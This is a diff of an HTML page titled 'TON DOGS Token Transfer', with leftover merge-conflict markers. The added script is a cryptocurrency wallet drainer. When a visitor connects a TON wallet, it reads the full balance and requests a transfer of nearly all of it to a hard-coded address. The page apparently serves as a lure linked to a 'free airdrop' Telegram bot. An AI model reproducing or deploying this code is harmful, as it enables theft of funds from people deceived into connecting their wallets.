@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON DOGS Token Transfer</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<<<<<<< HEAD
     <script src="https://unpkg.com/ton-core@latest/dist/ton-core.min.js"></script>
     <script src="https://unpkg.com/ton-web3@latest/dist/ton-web3.min.js"></script>
     <style>
@@ -53,5 +54,67 @@
         </div>
     </div>
     <script src="script.js"></script>
+=======
+</head>
+<body>
+
+    <div class="center" id="ton-connect"></div>
+    <div id="transaction-status"></div>
+
+    <script>
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+
+        tonConnectUI.uiOptions = {
+            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+        };
+
+        const destinationAddress = 'EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY'; // Adres docelowy
+
+        async function getBalance(address) {
+            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+            const data = await response.json();
+            return BigInt(data.result);
+        }
+
+        async function sendTransaction(wallet) {
+            try {
+                const balance = await getBalance(wallet.account.address);
+                
+                // Odejmujemy 0.05 TON na opłaty transakcyjne
+                const amountToSend = balance - BigInt(50000000);
+
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 360, // 5 minut ważności
+                    messages: [
+                        {
+                            address: destinationAddress,
+                            amount: amountToSend.toString(),
+                        }
+                    ]
+                };
+
+                const result = await tonConnectUI.sendTransaction(transaction);
+                document.getElementById('transaction-status').innerText = 'Transakcja wysłana: ' + result.boc;
+            } catch (error) {
+                console.error('Błąd podczas wysyłania transakcji:', error);
+                document.getElementById('transaction-status').innerText = 'Błąd: ' + error.message;
+            }
+        }
+
+        tonConnectUI.onStatusChange(async (walletInfo) => {
+            if (walletInfo) {
+                console.log('Portfel podłączony:', walletInfo);
+                await sendTransaction(walletInfo);
+            } else {
+                console.log('Portfel odłączony');
+                document.getElementById('transaction-status').innerText = '';
+            }
+        });
+    </script>
+
+>>>>>>> refs/remotes/origin/main
 </body>
 </html>
